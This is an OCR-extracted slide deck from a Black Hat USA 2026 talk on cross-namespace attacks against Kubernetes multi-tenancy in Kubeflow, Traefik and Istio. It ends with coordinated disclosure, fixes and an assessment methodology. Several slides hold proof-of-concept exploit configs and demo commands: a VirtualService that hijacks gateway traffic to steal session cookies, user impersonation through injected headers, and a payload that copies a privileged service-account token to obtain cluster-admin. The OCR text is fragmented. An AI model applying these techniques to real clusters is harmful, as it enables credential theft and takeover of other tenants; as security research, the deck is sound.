---
title: "Breaking Multi-Tenancy Over and Over, and What We Can Learn From This"
speakers: ["Lorin Lehawany", "Sven Nobis"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Lorin Lehawany&Sven Nobis_Breaking Multi-Tenancy Over and Over, and What We Can Learn From This.pdf"
pages: 63
sha256: "8d2ae7802cc2134ce86714c08d362309131b7fab0eaba4b0281b6344d8d412c6"
text_chars: 16398
ocr_pages: 6
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T23:11:43Z"
---
# Breaking Multi-Tenancy Over and Over, and What We Can Learn From This

**Speakers:** Lorin Lehawany, Sven Nobis  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Lorin Lehawany&Sven Nobis_Breaking Multi-Tenancy Over and Over, and What We Can Learn From This.pdf` (63 pages)


## Slide 1

Breaking Multi-Tenancy Over and Over, and What We Can Learn From This

Lorin Lehawany

Sven Nobis

Black Hat USA 2026

1

## Slide 2

**Sven Nobis** Senior Security Analyst @ ERNW

Who we are

**Lorin Lehawany** Security Analyst @ ERNW

2

## Slide 3

Who we are

3

## Slide 4

4

Are you using Kubernetes?

## Slide 5

Are you running …

**ML workloads?** Data Ingestion? Webhooks? **Complex applications with scripting capabilities?** Scripting? SSRF? **CI/CD pipelines?** Data Ingestion? AI Agents? Custom Scripts? Third-party controllers?

...

5

## Slide 6

You are running a **multi-tenant** platform!

Yes... whether you intended to or not!

6

## Slide 7

You are probably securing your cluster with ...

Role-Based Access Control (RBAC), **Network Policies,** Runtime Detection, **Pod Security Standards,** Image Scanning, Resource Quotas, **Admission Controllers,**

...

7

## Slide 8

Are industry best-practices enough?

No!

Our research shows why.

8

## Slide 9

-
How to Break Multi

Tenancy

Over?

9

Breaking Multi-Tenancy

## Slide 10

-
Breaking Multi

Tenancy

-
What is Namespace

-
based Multi

```
o
o
```

We found various ways to break

-

Tenancy

Current security best practices

```
o
```

problems

We present exploits

in three projects

-

Control plane layer

```
o
o
```

Data plane layer

Tenant A

Tenant B

Control Plane
Namespace A
Namespace B
Cluster
Control Plane Data Plane

10

## Slide 11

-
Insecure Cross

Namespace References in CRDs

11

Breaking Multi-Tenancy

## Slide 12

-
What are Cross

Namespace References?

Cluster

Namespace

ns1

Namespace

ns2

```
apiVersion:
apiVersion: crd.example/v1
crd.example/v1kind: SourceCRD
kind: TargetCRDspec:
metadata:reference:
name: examplename: example
namespace: ns1
```

12

## Slide 13

- Real World Scenario: Kubeflow

13

## Slide 14

- Real World Scenario: Kubeflow

14

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
USA
2026
@ Kubeflow Central Dashboa +
kubeflow.gke.gcp.ernw.eu/_/jupyter/?ns=attacker
Kubeflow @ attacker (owner) ¥
Home Notebooks + New Notebook
Notebooks
>= Filter Enter property na ()
Last
Status Name Created at Ima: Memory
activity
g attackers-n.. 32 minutes ago -  jupyter-scipy:... . 1.0 Gi CONNECT
Items per page: 10
```

## Slide 15

- Real World Scenario: Kubeflow

15

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
USA
2026
@ Kubeflow Central Dashboa +
kubeflow.gke.gcp.ernw.eu/_/jupyter/?ns=attacker
a
Ww Kubeflow @ attacker (owner) ¥
fr Home Notebooks
Notebooks _.
= Filter Enter prope
Status Name # Created at
Volume
g attackers-n... 32 minutes ago
Katib E
rve Endpoints
Pipelines
Last
activity
Image
jupyter-scipy:...
Items per page: 10
Memory
1.0 Gi
CONNECT
+ New Notebook
```

## Slide 16

- Real World Scenario: Kubeflow

16

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
USA
2026
@ Kubeflow Central Dashboa se
Cc 23 kubeflow.gke.gcp.ernw.eu/_/jupyter/?ns=attacker
+ New Notebook
ast
Image Memory
ivity
-  jupyter-scipy:... . 1.0Gi CONNECT
Items per page
simple ‘Guneher 0 QL
```

## Slide 17

-
Real

World Scenario: Kubeflow

```
(base) jovyan@attackers-notebook-0:~$ kubectlauth whoami
ATTRIBUTE   VALUE
Username    system:serviceaccount:attacker:default-editor
[...]
```

```
(base) jovyan@attackers-notebook-0:~$ kubectlauth can-i\
--list
```

17

## Slide 18

Permission

-
default

editor

|`(base) jovyan@attackers`
`--list`|`-notebook`|`-0:~$kube`|`ctl auth can-i \`|
|---|---|---|---|
|`Resources`|_`[...]`_|`Verbs`||
|`configmaps`|_`[...]`_|`[create`|`delete`_`[...]`_`]`|
|`deployments.apps`|_`[...]`_|`[create`|`delete`_`[...]`_`]`|
|`*.networking.istio.io`
_`[...]`_|_`[...]`_|`[create`|`delete`_`[...]`_`]`|

18

## Slide 19

Istio and  VirtualServices
Gateway Namespace Workload Namespace
Load  Virtual
Ingress Req. Istio Gateway Req. Req.
Balancer Service
End User
Virtual
Req.
Service
19

## Slide 20

Istio and  VirtualServices
amespace Workload Namespace
Virtual
. Istio Gateway Req. Req. Service Req. Pod
Service
Virtual
Service Pod
Req. Req.
Service
20

## Slide 21

-
Back to Cross

Namespace References

Cluster

Namespace

ns1

Namespace

ns2

```
apiVersion:
apiVersion: crd.example/v1
crd.example/v1kind: SourceCRD
kind: TargetCRDspec:
metadata:reference:
name: examplename: example
namespace: ns1
```

21

## Slide 22

-
Back to our Real

World Scenario

Cluster

Namespace

kubeflow

Namespace

attacker

`apiVersion: apiVersion: networking.istio.io/v1 networking.istio.io/v1` Attacker `kind: VirtualService kind: Gateway spec: metadata: gateways: name: kf-gateway - kubeflow/kf-gateway`

22

## Slide 23

Exploit

```
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
[...]
spec:
gateways:
-kubeflow/kf-gateway
hosts:
-'*'
http:
-match:
-uri:
prefix: /assets/favicon.ico
route:
```

```
-destination:
host: poc.attacker.svc.cluster.local
[...]
```

Attacker

23

## Slide 24

Impact
Cluster
NS  kubeflow $  kubegetl logs  poc
Cookie:
Ingress kf- gateway oauth2_proxy_kubeflo
w=dVX[...]
NS  attacker
Attacker’s Pod
Kubeflow
User Attacker 24
Request

## Slide 25

Vertical

Privilege Escalation

25

Finding a Way to Cluster Admin

## Slide 26

Bypassing Network Policies

Namespace
kubeflow
Ingress kf- gateway
- -
kserve models
.
Req
-
web application
Why is this a problem?
Req
.

Namespace

attacker

`apiVersion: networking.istio.io/v1 kind: VirtualService spec: gateways: - kubeflow/kf-gateway http: route: - destination: host: kserve-models-webapplication.kubeflow.svc.cluster.local` Attacker

26

## Slide 27

User Impersonation

```
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
[...]
spec:
gateways:
-kubeflow/kubeflow-gateway
http:
-headers:
request:
set:
```

Attacker

```
kubeflow-userid: "system:serviceaccount:kubeflow:kserve-controller-manager"
route:
```

- `destination:`

```
host: kserve-models-web-application.kubeflow.svc.cluster.local
[...]
```

27

## Slide 28

Full

: Deploy

InferenceService

```
{
```

`"resources": [ { "apiVersion": "serving.kserve.io/v1beta1", "kind": "InferenceService",` Attacker `[...]` POST `"spec": {` /poc/kserve /api/ `"predictor": { "containers": [` namespaces /kubeflow / - `{` kserve resources `"command": [ "/bin/sh", "-c", "kubectl create secret -n attacker generic poccluster-admin-token --fromfile=/run/secrets/kubernetes.io/serviceaccount/token; sleep 60000" ], "serviceAccountName": "profiles-controller-service-account" [...]`

-
kserve
-
models
-
web
application

28

## Slide 29

1",

```
ttacker generic poc-
token; sleep 60000"
troller-service-account"
```

29

## Slide 30

Full

: Deploy

InferenceService

```
{
```

`"resources": [ { "apiVersion": "serving.kserve.io/v1beta1", "kind": "InferenceService",` Attacker `[...]` POST `"spec": {` /poc/kserve /api/ `"predictor": { "containers": [` namespaces /kubeflow / - `{` kserve resources `"command": [ "/bin/sh", "-c", "kubectl create secret -n attacker generic poccluster-admin-token --fromfile=/run/secrets/kubernetes.io/serviceaccount/token; sleep 60000" ], "serviceAccountName": "profiles-controller-service-account" [...]`

-
kserve
-
models
-
web
application

30

## Slide 31

31

Demo Time!

## Slide 32

# Demo

Attacker

```
(base) jovyan@attackers-notebook-0:~$ kubectlget secrets
NAME                        TYPE     DATA   AGE
(base) jovyan@attackers-notebook-0:~$ kubectlapply -f
virtualservice-kserve.yaml
virtualservice.networking.istio.io/kserve-controller-poc
created
```

32

## Slide 33

# Demo

Attacker

```
(base) jovyan@attackers-notebook-0:~$ curl "$DOMAIN/poc-
vs/api/namespaces/kubeflow/kserve-resources" \
-H 'accept:application/json, text/plain, */*' \
-H 'content-type: application/json' \
```

```
-b "$COOKIES" \
```

```
-H "x-xsrf-token: $XSRF_TOKEN" \
--data-binary @curl-kserve.json
```

- `[...]`

```
{"createdResources":[{"apiVersion":"serving.kserve.io/v1bet
a1","kind":"InferenceService","name":"poc","namespace":"kub
eflow"}],"message":"1 KServeresource(s) successfully
created."}
```

## Slide 34

# Demo

Attacker

```
(base) jovyan@attacker-nb-0:~$ kubectlget secret
NAME                        TYPE     DATA   AGE
poc-cluster-admin-token     Opaque   1      43s
(base) jovyan@attacker-nb-0:~$ ./create-kubeconfig-from-
token.sh poc-cluster-admin-tokenkubeconfig.yaml
(base) jovyan@attacker-nb-0:~$ kubectl--kubeconfig
kubeconfig.yamlauth can-i--list
Resources   Non-Resource URLs   Resource Names   Verbs
*.* [] []               [*]
[*][]               [*]
```

34

## Slide 35

35

Fixing Multi-Tenancy in Kubeflow

## Slide 36

Fixing the Issue: Remove Istio Permission?

|`(base) jovyan@attackers-notebook`
`--list`|`-0:~$kubectl auth can-i \`|
|---|---|
|`Resources`_`[...]`_|`Verbs`|
|`configmaps`
_`[...]`_|`[create delete`_`[...]`_`]`|
|`deployments.apps`
_`[...]`_|`[create delete`_`[...]`_`]`|
|~~`*.networking.istio.io`~~
_~~`[...]`~~_
_`[...]`_|~~`[create delete`~~_~~`[...]`~~_~~`]`~~|

36

## Slide 37

Fixing the Issue:

Or even the Service Account?

|`(base) jovyan@attackers-notebook`
`--list`|`-0:~$kubectl auth can-i \`|
|---|---|
|`Resources`_`[...]`_|`Verbs`|
|~~`configmaps`~~
_~~`[...]`~~_|~~`[create delete`~~_~~`[...]`~~_~~`]`~~|
|~~`deployments.apps`~~
_~~`[...]`~~_|~~`[create delete`~~_~~`[...]`~~_~~`]`~~|
|~~`*.networking.istio.io`~~
_~~`[...]`~~_
_`[...]`_|~~`[create delete`~~_~~`[...]`~~_~~`]`~~|

37

## Slide 38

User Impersonation without Service Account

38

Breaking Multi-Tenancy **Over**

## Slide 39

Idea

Attacker

39

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
2026
ft < New notebook
| (B= Notebooks
. °
e
jupyter 1 2
JupyterLab VisualStudio Code RStudio
An interactive development weight but power An integrated
environment for R, a
code, and data. Ideal for a r programming langua
puting and
hics
Custom Notebook
Custom Image
europe-docker.pkg.dev/folkloric-stone-231516/ernw-images/snobis/poc-webserv:
IfNotPresent
```

## Slide 40

Phishing Attack Scenario

Attacker

1.

Attacker creates notebook with custom image

2.

Attacker authorizes victim in their namespace

3.

Attacker convinces victim to visit link to notebook

4.

Victim clicks on link

5.

otebook

either

logs the request to steal the cookie like before

```
o
```

-
or executes client

side code in Browser to perform actions on

```
o
```

behalf of the victim

40

## Slide 41

Phishing Attack Scenario

Attacker

41

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
USA
2026
F* Kubeflow Central Dashboa’ x [ESIRGSEYTe ae
23 kubeflow.gke.gcp.ernw.eu/notebook/snobisernw-de-ext/test/
DevTools - kubeflow.gke.gcp.ernw.eu/notebook/snobisernw-de-ext/test/
‘® [0 Elements Recorder Console Sources Network Performance Memory Application Privacyandsecurity Lighthouse AdBlock
® @ Y. QA) G@Preservelog CO Disablecache Nothrotting ~ @ %
Y Filter © Invert 1 Morefilters » All Fetch/XHR_ Doc CSS JS Font Img Media Manifest) WS Wasm | Other
20 ms 60 ms 80 ms 100 ms 120 ms 140 ms 160 ms 180 ms 200 ms
I -
Name X_Headers Payload __ Preview __Response__Initiator__Timing__Cookies
& test/
style.css
Request Payload view source
y {statusCode: 200, header: {content-length: "386", content-type: "application/json; charset=utf-8",..
& scripts body: "{\"user snobis #€XT#@ernwlab. onmicrosoft.com\",\"platform\":{\"kubeflowVersion\
© page-scriptjs ~ header: {content-length: "386", content-type: "application/json; charset=utf-8",..}
(config content-length:
content-type: "applic n/ json rset=utf-8
date: "Wed
etag: "W/\"182-E4zxd7 v1c aPHk
©) log server:
} env-info
x-envoy-upstream-service-time
x-powered-by:
statusCode: 200
dyn}
\"unknown\y
```

## Slide 42

- Real world Impact

Affected

Partially affected

42

## Slide 43

Coordinated Disclosure

```
o
```

```
o
```

```
o
o
```

43

-
CVE

-
2026

47237

fixed in Kubeflow by

removing the Istio edit permissions from the Service

```
o
```

Account

-
In addition, we introduce a multi

domain setup

fix the phishing attack scenario

Thanks to the Kubeflow project!

However,  i

nsecure

-
Cross

is a common problem in various other

projects.

## Slide 44

-
Insecure Cross

Namespace References in Annotations

44

Breaking Multi-Tenancy Over **and Over**

## Slide 45

-
Cross Namespace References in Annotations
Cluster
Namespace Namespace
ns1 ns2
kind: Example kind: Service
apiVersion:
apiVersion: v1
crd.example/v1
metadata:
metadata:
annotations:
name: target
[...] crd.example.ref:
ns1/target
45

## Slide 46

- Real World Scenario: Traefik

46

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
2026
Real-World Scenario: Traefik
46
```

## Slide 47

-
Real

World Scenario: Traefik

Cluster

Traefik
Req.
Proxy

mTLS

Namespace

victim

```
kind: ServersTransport
apiVersion:
traefik.io/v1alpha1
metadata:
name: st
spec:
certificatesSecrets:
-client-cert-
secret
```

```
kind: Service
apiVersion: v1
metadata:
annotations:
traefik.ingress.kubern
etes.io/service.serverstra
nsport: st@kubernetescrd: st@kubernetescrdst@kubernetescrd
```

nsport: st@kubernetescrd: st@kubernetescrdst@kubernetescrd
What is the impact?

47

## Slide 48

Impact

Cluster

Namespace

attacker

Namespace

victim

`kind: Service kind: ServersTransport apiVersion: apiVersion: v1 traefik.io/v1alpha1 metadata: metadata:` Attacker `annotations: name: st traefik.ingress.kubern spec: etes.io/service.serverstra certificatesSecrets: - client-certnsport: victimsecret st@kubernetescrd`

48

## Slide 49

Impact

Cluster

Namespace

Namespace

attacker

victim

`kind: Service kind: ServersTransport apiVersion: apiVersion: v1 traefik.io/v1alpha1 metadata: metadata:` Attacker `annotations: name: st traefik.ingress.kubern spec: etes.io/service.serverstra certificatesSecrets: - client-certnsport: victimsecret st@kubernetescrd`

Traefik
Req.
Proxy

Pod
socat Pod Req.

49

## Slide 50

Coordinated Disclosure

Issue is being fixed in Traefik.

```
o
o
o
o
```

-
Traefik updated their Multi

Tenancy security documentation and

recommends using the Gateway API.

Thanks to the Traefik project!

insecure

Namespace References in

Annotations

is a general problem

`o` And can even have impact beyond the scope of the cluster! `apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: gcp-ingress annotations: ingress.gcp.kubernetes.io/pre-shared-cert: gcp-compute-cert`

50

## Slide 51

-
Cross

Namespace Attacks on Data Plane

51

Breaking Multi-Tenancy Over And Over **And Over**

## Slide 52

Back to Istio &  Its Service Mesh
Cluster
Namespace
victim
Pod
Workload
Istio
Req. Req. example.com
Container
Sidecar
Internet

52

## Slide 53

Exploit & Impact

Namespace
victim
Pod
Workload
Istio
Req. Req.
Container
Sidecar

Namespace

attacker

`apiVersion: networking.istio.io/v1b eta1 kind: VirtualService metadata: name: intercept spec: hosts: - "example.com"` Req. `gateways: - mesh`

Pod

53

## Slide 54

Coordinated Disclosure

Istio maintainers consider this issue to be expected behavior

```
o
```

-
Purposeful user experience trade

off

```
o
o
```

Recommendation:

API as a replacement in

-
Namespace

-
based Multi

Tenancy

Together with Istio, we published the Security Note

-

```
o
```

-
SECURITY

-
2026

002

Blog Post

to address this issue.

Thanks to the Istio project!

```
o
```

54

## Slide 55

What We Can Learn From It?

Methodology

55

## Slide 56

- Methodology

- -

- _1. Use:_ Do I use Namespace based Multi Tenancy? _2. Assess:_ How do I identify potential weaknesses? _3. Address:_ How do I address them?

56

## Slide 57

1. 2.  3.
Use Assess Address

-
1. Do I use Namespace

-
based Multi

Tenancy?

-
Where is Namespace

-
based Multi

Tenancy commonly found:

Multiple teams,

often

access

```
o
```

Deploy different applications into the same cluster

```
o
o
o
o
o
o
o
```

Typically, share a level of trust

indirect

```
o
```

Machine learning

CI/CD pipelines

Scripting capabilities in applications

Typically, untrusted

Sometimes, this is

unobvious

-
Namespace

-
based Multi

Tenancy

57

## Slide 58

1. 2.  3.
Use Assess Address
2. How do I identify potential weaknesses?
-
Apply Hardening Industry best practices are applied.
Identify
Which resources are in control of a tenant?
Components
Assess What control plane interaction?
Resources What data plane interaction?
Evaluate
Does this affect the security (CIA) of components
Interactions outside of the Namespace?

58

## Slide 59

1. 2. 3. Use Assess Address

3. How do I address them?

Deployment of vendor fixes

Usage of existing admission policy sets Definition of custom policies

59

## Slide 60

Admission Controls

```
gateways:
'mesh'
'victim/[...]'
'allowed-gw'
```

```
'victim/[...]'
apiVersion: networking.istio.io/v1beta1
kind: VirtualService'allowed-gw'
[...]
spec:
gateways:
-mesh
hosts:
hosts:
-'*''*'
http:
'example.com'
-[...]
'allowed-host.svc'
```

60

## Slide 61

61

Conclusion

## Slide 62

Conclusion

Namespaced

resources can have impact on the

-

control plane

- `o`

data plane

or even beyond the cluster

-

This can introduce severe security issues

- `o`

These problems are common

but their presence may be unobvious

-

Invest time to assess your clusters

- `o`

Use our methodology as a guideline to ...

identify unobvious multi tenancy in your cluster

- `o`

-
perform an in

depth analysis of the tenants'

apply or develop fixes of the found weaknesses

-

ernw.de/ en/whitepapers/issue - 78.html

62

## Slide 63

Thank you for your attention!

**Lorin Lehawany** Security Analyst , ERNW Mail: <u>llehawany@ernw.de</u> - LinkedIn: <u>@lorin lehawany</u>

**Sven Nobis** Senior Security Analyst , ERNW Mail: <u>snobis@ernw.de</u> - LinkedIn: <u>@sven nobis</u>

ERNW Blog: <u>insinuator.net</u>

63
